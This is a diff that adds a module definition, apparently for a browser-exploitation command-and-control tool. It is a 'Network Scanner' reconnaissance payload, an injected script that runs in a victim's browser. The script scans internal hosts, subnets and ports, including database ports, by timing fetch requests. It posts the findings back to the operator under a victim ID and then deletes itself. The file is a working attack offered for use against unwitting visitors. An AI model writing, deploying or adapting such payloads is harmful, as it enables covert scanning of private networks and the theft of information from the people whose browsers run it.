@@ -1,0 +1,30 @@
+{
+  "name": "Network Scanner",
+  "description": "Scans target hosts and ports from the browser using fetch timing",
+  "category": "Reconnaissance",
+  "icon": "",
+  "inputs": [
+    {
+      "id": 0,
+      "label": "Targets (e.g. 192.168.1.1, 192.168.1.0/24)",
+      "type": "string",
+      "required": true
+    },
+    {
+      "id": 1,
+      "label": "Ports (e.g. 80,443,8080 or 8000-8100)",
+      "type": "string",
+      "required": false
+    },
+    {
+      "id": 2,
+      "label": "Timeout ms",
+      "type": "string",
+      "required": false
+    }
+  ],
+  "payload": "<script>(async function(){var targets='{{ params[0] }}';var ports='{{ params[1] }}';var timeout=parseInt('{{ params[2] }}')||2000;var DEFAULT_PORTS='80,443,8080,8443,3000,3001,5000,5001,8000,8001,8080,8081,8443,8444,6969,9000,9090,9200,9300,5601,3306,5432,1433,27017,6379,11211,4443,7080';var BATCH=20;function parsePorts(input){var result=[];var parts=(input&&input.trim().length>0?input:DEFAULT_PORTS).toString().split(',');for(var i=0;i<parts.length;i++){var p=parts[i].trim();if(p.indexOf('-')>-1){var r=p.split('-');var s=parseInt(r[0]);var e=parseInt(r[1]);for(var j=s;j<=e&&j<=65535;j++)result.push(j);}else{var n=parseInt(p);if(n>0&&n<=65535)result.push(n);}}return result;}function parseTargets(input){var hosts=[];var parts=input.split(',');for(var i=0;i<parts.length;i++){var t=parts[i].trim();if(t.indexOf('/24')>-1){var base=t.replace('/24','');var oct=base.split('.');var pfx=oct[0]+'.'+oct[1]+'.'+oct[2]+'.';for(var j=1;j<255;j++)hosts.push(pfx+j);}else if(t.length>0){hosts.push(t);}}return hosts;}function scanPort(host,port){return new Promise(function(resolve){var start=performance.now();var ctrl=new AbortController();var timer=setTimeout(function(){ctrl.abort();resolve({host:host,port:port,state:'filtered',time:timeout});},timeout);fetch('http://'+host+':'+port+'/',{mode:'no-cors',signal:ctrl.signal,cache:'no-store'}).then(function(){clearTimeout(timer);resolve({host:host,port:port,state:'open',time:Math.round(performance.now()-start)});}).catch(function(e){clearTimeout(timer);var el=Math.round(performance.now()-start);if(e.name==='AbortError')resolve({host:host,port:port,state:'filtered',time:timeout});else if(el<timeout*0.3)resolve({host:host,port:port,state:'closed',time:el});else resolve({host:host,port:port,state:'open',time:el});});});}var report={scan_time:new Date().toISOString(),targets:targets,open_ports:0,results:[]};try{var hostList=parseTargets(targets);var portList=parsePorts(ports);var allScans=[];for(var h=0;h<hostList.length;h++)for(var p=0;p<portList.length;p++)allScans.push({host:hostList[h],port:portList[p]});report.total_probes=allScans.length;for(var b=0;b<allScans.length;b+=BATCH){var res=await Promise.all(allScans.slice(b,b+BATCH).map(function(s){return scanPort(s.host,s.port);}));res.forEach(function(r){if(r.state==='open'){report.results.push(r);report.open_ports++;}});}}catch(e){report.error=e.message;}var moduleId='{{module_id}}';fetch('c/{{victim_id}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data_type:'module_data',module_id:moduleId,metadata:report})}).finally(function(){__removeModule();});}());</script>",
+  "link": "c/{{victim_id}}",
+  "created_at": "2026-04-24T21:56:00.000000",
+  "updated_at": "2026-04-24T21:56:00.000000"
+}
